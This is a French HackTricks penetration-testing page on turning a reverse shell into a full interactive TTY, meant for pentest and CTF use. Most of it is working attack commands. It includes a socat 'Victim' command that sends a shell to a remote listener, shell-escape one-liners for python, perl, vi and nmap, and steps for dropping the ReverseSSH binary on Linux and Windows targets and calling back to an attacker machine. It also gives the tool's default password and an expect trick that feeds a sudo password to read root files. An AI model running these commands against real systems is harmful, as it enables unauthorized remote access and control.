# TTY complets

{{#include ../../banners/hacktricks-training.md}}

## TTY complet

Notez que le shell que vous définissez dans la variable `SHELL` **doit** être **répertorié dans** _**/etc/shells**_, sinon le message `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` s'affichera. Notez également que les extraits suivants ne fonctionnent qu'avec bash. Si vous êtes dans un zsh, passez à bash avant d'obtenir le shell en exécutant `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Vous pouvez obtenir le **nombre** de **lignes** et de **colonnes** en exécutant **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Une méthode pratique pour obtenir un **interactive shell access**, ainsi que pour effectuer des **file transfers** et du **port forwarding**, consiste à déposer le serveur ssh statiquement lié [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sur la cible.<sup>[[1]](#references)</sup>

Voici un exemple pour `x86` avec des binaires compressés avec upx. Pour les autres binaires, consultez la [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Préparez la machine locale pour intercepter la requête de port forwarding ssh :
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Cible Linux :
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Cible Windows 10 (pour les versions antérieures, consultez le [project readme](https://github.com/Fahrj/reverse-ssh#features)) :
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Si la demande de port forwarding de ReverseSSH a réussi, vous devriez maintenant pouvoir vous connecter avec le mot de passe par défaut `letmeinbrudipls` dans le contexte de l'utilisateur exécutant `reverse-ssh(.exe)` :
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) met automatiquement à niveau les Linux reverse shells vers un TTY, gère la taille du terminal, journalise tout et bien plus encore. Il fournit également la prise en charge de readline pour les Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Pas de TTY

Si, pour une raison quelconque, vous ne pouvez pas obtenir un TTY complet, vous **pouvez quand même interagir avec les programmes** qui attendent une saisie utilisateur. Dans l’exemple suivant, le mot de passe est transmis à `sudo` pour lire un fichier :
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Références

- [1] [ReverseSSH - Serveur ssh lié statiquement avec fonctionnalité de reverse shell pour les CTF et autres](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Gestionnaire de Shell qui automatise certaines tâches pour faciliter la vie](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
